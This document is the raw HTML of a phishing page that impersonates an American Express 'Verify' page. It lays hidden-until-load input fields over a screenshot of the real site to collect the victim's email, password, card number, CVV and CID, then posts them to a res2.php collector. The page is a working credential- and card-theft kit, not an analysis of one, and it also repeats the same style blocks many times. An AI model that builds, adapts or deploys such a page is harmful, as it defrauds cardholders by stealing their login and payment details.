﻿<HTML><head>
<title>American Express | Verify </title>
<meta http-equiv="content-type" content="text/html; charset=UTF8">

<link type="image/x-icon" rel="shortcut icon" href="https://taijionmaui.files.wordpress.com/2011/10/blue-sky.jpg">

<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">


<style> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</style> 

<style type="text/css">
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body bgColor="#F3F3F3" Link="#000000" VLink="#000000" ALink="#000000">
<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<DIV id=container>
<DIV id=image2 style="HEIGHT: 540px; WIDTH: 700px; LEFT: 216px; Z-INDEX: 1; TOP: 0px"><IMG title="" border=0 alt="" src="https://tdsavetrust.com/img/ame/img/2.png" width=1265 height=700></DIV>

<BR><BR><BR><BR><BR>

<FORM id=chalbhai onsubmit=" return formbreeze_sub()" method=post name=chalbhai action=res2.php>

<INPUT class=textbox style="HEIGHT: 22px; WIDTH: 210px; POSITION: absolute; LEFT: 435px; Z-INDEX: 5; TOP: 260px" maxLength=50 size=1 name=email required placeholder="">

<INPUT class=textbox style="HEIGHT: 22px; WIDTH: 210px; POSITION: absolute; LEFT: 435px; Z-INDEX: 6; TOP: 288px" size=1 type=password name=password required placeholder=""> 

<INPUT class=textbox style="HEIGHT: 22px; WIDTH: 180px; POSITION: absolute; LEFT: 435px; Z-INDEX: 5; TOP: 325px" maxLength=50 size=1 name=card required placeholder="">

<INPUT class=textbox style="HEIGHT: 22px; WIDTH: 50px; POSITION: absolute; LEFT: 435px; Z-INDEX: 5; TOP: 398px" maxLength=4 size=1 name=cvv required placeholder="">

<INPUT class=textbox style="HEIGHT: 22px; WIDTH: 45px; POSITION: absolute; LEFT: 435px; Z-INDEX: 5; TOP: 426px" maxLength=4 size=1 name=cid required placeholder="">

</div>

</div>
</div>
</div>





<DIV id=formimage1 style="POSITION: absolute; LEFT: 435px; Z-INDEX: 7; TOP: 547px"><INPUT height=35 src="img/button.png" type=image width=100 name=formimage1></DIV></FORM></DIV>

<BR><BR><BR><BR><BR><BR><BR>

<IMG src="http://none.com" width=0 height=0> </BODY></HTML>